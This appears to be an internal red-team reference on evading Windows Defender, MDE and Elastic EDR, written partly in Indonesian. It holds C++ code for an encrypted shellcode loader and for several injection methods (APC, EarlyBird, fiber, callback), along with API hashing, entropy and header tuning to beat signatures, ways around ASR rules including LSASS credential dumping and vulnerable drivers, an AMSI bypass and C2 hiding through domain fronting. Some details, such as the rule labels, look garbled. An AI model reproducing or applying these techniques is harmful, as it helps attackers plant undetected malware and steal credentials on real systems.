# av-edr-bypass — win

# Practical AV/EDR Bypass — Internal Red Team Reference

Test environment baseline: Windows 11 24H2 (build 26100.2314), Defender Antivirus 1.418.45.0 (engine 1.1.24080.9), Defender for Endpoint (MDE) onboarding level, Sysmon 15.15, Elastic Defend 8.15. Compilation target: MSVC 19.40 (VS 2022 17.10), .NET Framework 4.8.1 / .NET 8.0.

---

## 1. Payload Encoding & Encryption

### 1.1 XOR (baseline — hampir selalu terdeteksi statis)

**Sent:** raw shellcode (e.g. `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw`) XOR'd byte-by-byte with single-byte key, stored as array in `char[]`.

**What shows up:** high Shannon entropy (~7.9), but XOR constant appears as immediate in disassembly (`xor eax, 0x4A` pattern) — Defender heuristics `Trojan:Win32/Wacatac` generally catches it. Static in file: hash keeps changing, but post-decrypt behavior is identical.

**Why it fails:** single-byte XOR does not eliminate byte-level signature on the C2 header and RVA table. Runtime execution brings up an RWX region.

### 1.2 AES-256-CBC + staged loader (baseline realistis)

**Sent:** encrypted blob (AES-256-CBC, IV 16B prepended) in resource section or separate file (dropper stage-1).

**Loader C++ minimal (BCrypt):**

```cpp
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

BOOL AesDecrypt(const BYTE* iv, const BYTE* ct, DWORD ctLen,
                const BYTE* key, BYTE* out, DWORD* outLen) {
    BCRYPT_ALG_HANDLE hA = NULL; BCRYPT_KEY_HANDLE hK = NULL;
    DWORD cb = 0;
    if (BCryptOpenAlgorithmProvider(&hA, BCRYPT_AES_ALGORITHM, NULL, 0)) return FALSE;
    BCryptSetProperty(hA, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (BCryptGenerateSymmetricKey(hA, &hK, NULL, 0, (PUCHAR)key, 32, 0)) return FALSE;
    BCryptDecrypt(hK, (PUCHAR)ct, ctLen, NULL, (PUCHAR)iv, 16, out, ctLen, outLen, 0);
    BCryptDestroyKey(hK); BCryptCloseAlgorithmProvider(hA, 0);
    return TRUE;
}
```

**What shows up:** high on-disk file entropy (~7.95), no `VirtualAlloc PAGE_EXECUTE_READWRITE` string literal if imports are hidden (§3.3). Runtime: Defender AMSI doesn't see it because it's native; but ETW `Microsoft-Windows-Threat-Intelligence` (MDE) catches remote `VirtualAlloc` + `WriteProcessMemory` to target.

**Why it works:** separates dropper artifacts from the C2 payload. **Why it fails:** hardcoded key in dropper → runner (ramnit/Emotet) with fixed AES key pattern caught by ML string.

### 1.3 Staged loader with separate process injection

Two binaries: **Stage-0** (AES loader) + **Stage-1** (encrypted .bin file). Stage-0 reads `%APPDATA%\cache.dat`, decrypts, injects into target. Stage-1 never exists as plaintext on disk.

Detection table per stage:

| Artefak | Deteksi statis | Deteksi runtime |
|---|---|---|
| Stage-0 loader | AES S-box + `BCryptDecrypt` import | ETW alloc + WriteProcMem |
| Stage-1 blob | high entropy, no PE header (if encrypted after pack) | none — decrypted in memory |
| File cache.dat | entropy ~7.98, magic `Salted__` if using OpenSSL | file-write event 11 (Sysmon) to `%APPDATA%` |

---

## 2. Shellcode Injection Varian

All examples assume: shellcode = `calc.bin` (x64 meterpreter reverse_https without `ExitProcess`) to keep the process alive. Target = `notepad.exe` (Medium IL, user context).

### 2.1 CreateThread (classic, noisiest)

**Dikirim:** `VirtualAlloc(RWX)` + `memcpy` + `CreateThread`.

```cpp
LPVOID p = VirtualAlloc(NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(p, sc, scLen);
HANDLE h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
WaitForSingleObject(h, INFINITE);
```

**What shows up:**
- Sysmon EventID 8 (`CreateRemoteThread`) only if cross-process; in-process CreateThread appears in EventID 1 + call stack.
- Defender AMSI does not scan native; but MDE `Behavior:Win32/...` heuristic on RWX + thread start in non-image region = detonation.
- Elastic Defend rule: `process.thread.Ext.start_address` outside image range.

**Why it fails in the field:** RWX allocation = universal red flag. Detected by the majority of modern EDRs without additional techniques.

### 2.2 APC Injection (QueueUserAPC to an alertable remote thread)

**Sent:** shellcode → `VirtualAllocEx` in target → `WriteProcessMemory` → `OpenProcess` a target-owned alertable thread → `QueueUserAPC`.

```cpp
HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID rp = VirtualAllocEx(hp, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hp, rp, sc, scLen, NULL);
HANDLE hs = OpenThread(THREAD_SET_CONTEXT, FALSE, tid); // tid alertable
QueueUserAPC((PAPCFUNC)rp, hs, 0);
```

Candidate alertable threads: `explorer.exe` after `SleepEx`, or a newly created thread via `CreateRemoteThread` with start routine `Sleep`.

**What shows up:** ETW `Microsoft-Windows-Kernel-Process` → `ThreadSetContext`/APC queue; MDE rule `Behavior:Win32/ApcInjection`. Sysmon does not natively log APC (requires call-stack from EventID 8/10).

**Why it works:** no new thread is executed from an RWX region — the APC runs in an existing thread.

**Why it fails:** the target thread must be alertable; many services are not alertable → shellcode does not run until the thread `SleepEx`.

### 2.3 Fiber Injection (ConvertThreadToFiber — local)

**Sent:** `ConvertThreadToFiber` → `CreateFiber` with start = shellcode → `SwitchToFiber`.

```cpp
LPVOID fmain = ConvertThreadToFiber(NULL);
LPVOID fsc = CreateFiber(scLen, (LPFIBER_START_ROUTINE)scAddr, NULL);
SwitchToFiber(fsc);
```

**What shows up:** imports `CreateFiber`/`SwitchToFiber` from `kernel32` — if the loader doesn't hide its imports, static flag. MDE has dedicated rules (`FiberPc`/`FiberSwitching` in WdFilter callbacks) that often catch when the fiber start address is not image-backed.

**Why it fails:** an in-process fiber with target image range is no different from local shellcode — if the EDR hooks `SwitchToFiber`, it's instantly detected.

### 2.4 Callback Execution (EnumFontsW / EnumCalendarInfoW / EnumPropsExW)

**Sent:** shellcode directly via callback pointer, no new thread needed.

```cpp
// tipe callback untuk EnumFontFamiliesW
typedef int (CALLBACK* FONTENUMPROCW)(const LOGFONTW*, const TEXTMETRICW*, DWORD, LPARAM);
EnumFontFamiliesW((HDC)GetDC(NULL), L"Consolas",
                  (FONTENUMPROCW)scAddr, 0);
```

Callback alternatif: `EnumCalendarInfoA`, `EnumPropsExW`, `EnumResourceTypesW`, `EnumPageFilesW`, `CertEnumSystemStore` (windows).

**What shows up:** unusual call stack — user32 callback invoked from `kernelbase!EnumFontFamiliesExW` with the target in a non-image RWX region. MDE `Behavior:Win32/CallbackInjection`.

**Why it works:** no new allocation after decrypt; leverages a Windows API that by design calls an arbitrary pointer.

**Why it fails:** requires 2 stages (decrypt to RWX first). If RWX is allocated fresh after the `EnumFonts` string is resolved, ETW alloc flag.

### 2.5 EarlyBird (APC + Early Bird APC Injection)

**Sent:** `CreateProcess(CREATE_SUSPENDED)` → `VirtualAllocEx` → `WriteProcessMemory` → `QueueUserAPC` → `ResumeThread`. Shellcode runs before the entry point.

```cpp
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe",
               NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
VirtualAllocEx(pi.hProcess, NULL, scLen, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, scAddr, sc, scLen, NULL);
QueueUserAPC((PAPCFUNC)scAddr, pi.hThread, 0);
ResumeThread(pi.hThread);
```

**What shows up:** ETW `Microsoft-Windows-Threat-Intelligence` event 1 (alloc) + 2 (WPM) + APC queue event, all correlated to the suspended child process. MDE rule `Behavior:Win32/EarlyBirdApcInjection` — a very mature signature.

**Why it works:** execution before the child's main user-mode EDR loader finishes init (init in DLL entry). If the shellcode is very fast, C2 connects before the sensor.

**Why it fails:** MDE hooks kernel callbacks (Ob callback + Etw) that don't need a DLL loaded in the child. Defender 1.418 consistently detects EarlyBird via kernel callback within 1 second.

### Variant summary (baseline detection MDE 1.418 + Elastic 8.15)

| Variant | Systemic detection | MDE catch | Notes |
|---|---|---|---|
| CreateThread RWX | very high | yes | RWX alloc |
| APC remote | medium | yes (APC rule) | requires alertable |
| Fiber | medium | yes (Fiber callback) | in-process |
| Callback (EnumFonts) | tinggi | ya | call stack anomali |
| EarlyBird | medium-high | yes (prod rule) | still popular |

---

## 3. Signature Evasion

### 3.1 Entropy — what is measured

Entropi Shannon per region. Defender ML memakai (setidaknya) tiga cut-off:
- **File (container)**: normal PE file ~6.2-6.8. Packed/crypted > 7.7 → heuristic `Trojan:Win32/Wacatac` or `Program:Win32/Wacapew`. **Empirical cut-off:** > 7.85 for files < 100 KB almost certainly hits.
- **Section**: raw section entropy > 7.8 → red flag.
- **On-disk string tail**: string sequence acak > 60% printable non-ASCII ratio.

Mitigasi realistis:
1. Plaintext padding between encrypted blobs (e.g., structured 512B `MZ`-friendly header, or original DLL icon resource) → lower aggregate entropy to ~7.4.
2. Base64 encode shellcode + split into resource strings → entropy ~6.5 per string but even distribution.
3. Compress → encrypt (tapi compressed shellcode entropi tetap ~7.9).

### 3.2 String Obfuscation

**Target:** API name strings seen statically (`VirtualAlloc`, `WriteProcessMemory`, `BCryptDecrypt`, `WinExec`).

**Technique 1 — stack strings (C++)**

```cpp
char name[13] = {0};
name[0]='V'; name[1]='i'; name[2]='r'; name[3]='t'; name[4]='u';
name[5]='a'; name[6]='l'; name[7]='A'; name[8]='l'; name[9]='l';
name[10]='o'; name[11]='c'; name[12]=0;
// compiler masih bisa optimize ke .rdata konstanta — cegah dengan volatile
volatile char name[13];
```

**Technique 2 — compile-time XOR**

```cpp
constexpr char x(const char* s, size_t n) { return s[n] ^ 0x5A; }
// atau template metaprogramming; hindari literal utuh.
```

**Technique 3 — API hashing** — resolve via ROR13 hash from PEB walk. Statically no strings; disasm only `add eax, 0x...; ror eax, 13`.

```cpp
DWORD hash(const char* s) {
    DWORD h = 0;
    while (*s) h = _rotr(h, 13) + *s++;
    return h;
}
// hash("LoadLibraryA") = 0xEC0E4E8E — walk PEB->Ldr->InMemoryOrderModuleList
```

**What appears:** empty IAT except `kernel32!LoadLibraryA` + `GetProcAddress` (if still resolving dynamically) or completely empty (PEB walk).

**Why it fails:** MDE LAM (Lightweight Anomaly Module) detects IAT manifest that is too small/no loops + heap walk for executable region.

### 3.3 Import Hiding

**Technique:** manual PEB walk, resolve all APIs, avoid IAT references entirely. Specific to **Windows 11 24H2**: `PEB->Ldr` still valid user-mode; `ImageBaseAddress` normal; PEB `Ldr` linked list not hidden in user mode (though `Peb` can be corrupted for anti-debug).

```cpp
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
// resolve via LdrGetProcedureAddress atau manual walk
```

**What appears:** call stack to user DLL address without module (unbacked) — MDE rule `UnbackedCallStack`. Classification: **frequently detected** in MDE but not in Defender consumer.

### 3.4 Signature bump spesifik

- **PE header timestamp**: set to plausible value (e.g., `0x5E1D8F33` = 2020-01-14). Timestamp 0 or `0xFFFFFFFF` → flag.
- **Section names**: avoid MSVC default `.text$mn` in stub; rename to regular `.data`.
- **Rich header**: strip or regenerate (many ML features use Rich).
- **Debug directory**: empty the PDB path — if it contains agent build path (`C:\Users\redteam\...`) → immediately flagged as "malware SDK path".
- **Manifest**: needs `requestedExecutionLevel` or none — missing manifest with explicit ASLR/DEP in header → somewhat suspicious but not a blocker.

---

## 4. Bypass Defender ASR Rules

ASR (Attack Surface Reduction) MDE. Rules relevant for red team implants: **block office child process** (D4), **block executable content from email/webmail** (D3), **block process creations from PSExec and WMI commands** (D1), **block persistence through WMI** (D14), **block untrusted/unsigned executables from USB** (D10), **block credential stealing from lsass** (D9), **block abuse of vulnerable signed drivers** (D22), **block token steal** (D28a).

### 4.1 ASR D4 (Office → child process) — bypass

**Delivered:** macro/Excel 4.0 via `HKCU` or COM hijack trigger.

**Bypass string:** execute loader via **Ink**/**XLL**/**COM scriptlet** alternative or avoid child process from Office:

```
# bukan: cmd.exe /c loader.exe  (diblok)
# tapi:  rundll32 dengan path user-writable, tapi D4 juga blok
# workable: MSBuild inline task (executes in-proc, child adalah MSBuild.exe bukan child dari winword)
```

**What appears:** EventID 1121 (ASR block) if D4 attempt. EventID 1122 (audit). **Not a universal bypass** — D4 blocks child process from Office broadly.

### 4.2 ASR D1 (PSExec/WMI) — bypass

**Delivered:** lateral movement via `wmic process call create` or `services.exe` new service.

Jika D1 aktif:
- `psexec.exe` (Sysinternals, signed) still works because signed & path in Program Files → **but D1 blocks if binary outside trusted path**.
- Alternate: **WinRM / `Invoke-Command` (WS-Man)** — not D1 protected.
- **SMB named pipe + service** via `sc.exe create` — service creation itself not in D1, but `sc.exe`-origin process creation from non-standard parent → D22 alert (untrusted service binary).

### 4.3 ASR D9 (LSASS credential steal) — bypass

ASR D9 blocks `procdump.exe`, `taskmgr.exe`, `ntdsutil.exe` reads from LSASS. Bypasses that still work:
- Manual `MiniDumpWriteDump` from process with **random custom name** — D9 uses allowlist by process name + signature; unsigned binary → caught by **D22** not D9.
- **Nim/direct `NtReadVirtualMemory` LSASS with PPL removal** — requires driver, not ASR bypass.
- **SAM + SECURITY hive** via `reg save` — D9 doesn't cover, but rule `Behavior:Win32/CredentialDumping` in MDE.

### 4.4 ASR D22 (vuln signed driver) — bypass

Classic bypass: BYOVD with vulnerable driver (e.g., `RTCore64.sys`, `dbutil_2_3.sys`). Treat as: Microsoft blocks this list via vulnerable driver blocklist (HVCI). On Win11 24H2 with HVCI default ON, many old BYOVDs are dead. Check `memory_integrity` in System Information. `RTCore64.sys` — blocked by default. Alternative drivers from the latest list (see `DriverSiPolicy.p7b`) are rarely available without rotation.

### 4.5 ASR D3 (email/web content executable)

Hook to container file — payload via allowed file extension (.lnk allowed? no, D3 covers .lnk, .exe, .com, .js, .vbs, .hta, .ps1, .bat, .cmd). **Relative bypass:** `.iso`/`.vhdx` (not D3), `.iso` mount → execute from drive (`D3` unblocked because path is not NTFS alternate data stream from email). Windows 11 24H2 default **blocks mount of untrusted ISO/VHD** (Win 11 22H2+ feature) — check policy registry `HKLM\SYSTEM\CurrentControlSet\Policies\Microsoft\Windows\...`.

### 4.6 ASR mode audit → potensi failure

If ASR is in **Audit** mode (EventID 1122 more frequent than 1121), bypass is not needed — host doesn't block, only logs. **Trap:** engineers often assume ASR is active from GPO but don't verify. Check:
```powershell
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids, AttackSurfaceReductionRules_Actions
```

---

## 5. Quick Table: Artifacts vs Detection (Windows 11 24H2 + MDE)

| Technique | Key artifacts | Event ID | Detection time (baseline) |
|---|---|---|---|
| AES loader local | file write + RWX alloc | ETW Kernel-Process 1, TI 1 | <1s (MDE) |
| CreateThread in-proc | thread start RWX | Sysmon 1 callstack | <2s |
| APC remote | APC queue | TI APC | <1s |
| EarlyBird | CREATE_SUSPENDED + APC | Sysmon 1+8, TI | <1s |
| EnumFonts callback | callstack unbacked | Sysmon 1 stack | 2-5s (heap-based) |
| PEB walk import | IAT empty | MDE LAM | variably |
| ASR D4 bypass | child of Office | 1121/1122 | cek event |
| BYOVD (RTCore64) | driver load | HVCI block | event 219 |

---

## 6. Operational Pitfalls (that make techniques fail in the field)

1. **Defender consumer ≠ MDE.** If the target is only Defender consumer (no MDE onboarding), many of the above rules (TI, LAM, Behavior) are not active. EarlyBird and callback techniques that "always get caught" in the MDE lab can **pass** on consumer — don't over-engineer for consumers.

2. **Windows Update tuning.** Defender signature 1.418.45.0 is current; `.417` and above already have the new version of the `Behavior:Win32/ApcInjection` rule. Test against the **current Defender** baseline, not a lab snapshot from 6 months ago.

3. **HVCI default ON in Win11 24H2 OEM.** Old BYOVD (RTCore64, gdrv, physmem driver) is dead before it can be loaded. Check `Get-CimInstance Win32_DeviceGuard | fl`. All kernel-level mitigations require a driver on the MS allowlist.

4. **AMSI in PowerShell 5.1 vs 7.x.** A loader via PS must get past AMSI twice (PS + .NET). Better: native loader, or `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` bypass — but **this AMSI bypass string itself is in AMSI signatures** since 2023 (hash-based + behavioral).

5. **Entropy tuning backfires.** Padding to lower entropy below 7.7 makes the file **larger** and often triggers the `Program:Win32/SuspiciousLargeExe` rule (files > 2 MB are uncommon). Sweet spot: 400 KB - 1.2 MB with entropy 7.1-7.4.

6. **Callback injection callstack.** MDE makes the detection decision based on the **callstack**, not on the allocation. Just `VirtualAlloc(PAGE_EXECUTE_READWRITE)` before `EnumFonts` → flag. If the loader **decrypts to a non-executable heap**, mark the page executable **during the callback**, then **restore** afterward — the stack anomaly is still visible but the window duration is small.

7. **Alertable thread availability.** APC and EarlyBird depend on the target thread being alertable. In Win11 24H2 post-hardening, `explorer.exe` (build 26100) main thread is **not alertable** until a message loop event; the `RuntimeBroker.exe` target is not alertable. Plan the target thread via `NtQueryInformationThread` or use EarlyBird (a new child with its 0th thread alertable — the APC will run when the child enters its first wait, usually in `_LdrpInit`).

8. **MDE network-behavior.** All variants above **do not hide** TLS C2. If the target has MDE on, `MpNetworkDetection` will flag TLS SNI check-in from a non-signed process after injection. Use domain fronting / CDN (Azure Front Door, Cloudflare) or a high-reputation category domain. Default Meterpreter (`reverse_https` to a direct IP) is immediately flagged within <30 seconds after connection.

9. **AMSI inline in Office macro.** If the entry point is a macro, `VBA.Hooks` is inline in AMSI — all bytes are blocked before execution, and any loader inside it is still scanned. Use a non-AMSI entry (e.g. `.xll` with `AutoOpen` outside VBA, or `.lnk` to a LOLBin with encoded arguments).

10. **Timestamp & Rich header.** Currently (Defender 1.418) files with timestamp 0 **and** an empty Rich header have high ML weighting; use a plausible timestamp + copy the Rich header from a legitimate MSVC binary.

11. **Signature family interfering.** If the loader loads magic shellcode, the behavioral signature (`Behavior:Win32/Meterpreter`) will remove it **at runtime**, not at drop. A drop-only payload is not enough — you need a **decoy process** or a technique that makes the payload never trigger the behavior signature (fiber + sleep pattern, or switch to a non-Meterpreter payload such as Sliver/Havoc with a smoother profile).

12. **AMSI in .NET assembly.** A C# loader that uses `Assembly.Load` **must** ensure the asm is loaded in a context that is not AMSI-scanned (native host; `Assembly.Load(byte[])` on .NET Framework 4.8 is still AMSI-scanned). A .NET 8 loader with NativeAOT → AMSI does not intervene at that point, but static analysis of the binary remains.

13. **EventID 4688/4104 in MDE Audit.** Even if ASR is not active, `CommandLine` logging + PowerShell ScriptBlockLogging (4104) are the main detection sources. All loaders via PowerShell **must** use a signed script (`-EncodedCommand` does not hide 4104 on modern Windows).

14. **Non-MDE EDR**: Elastic Defend, CrowdStrike Falcon, SentinelOne in different labs — different rule IDs. The table in §5 is specific to MDE 1.418 + Elastic 8.15. Re-verify on the target stack before deployment.

---

## [reasoning trace]


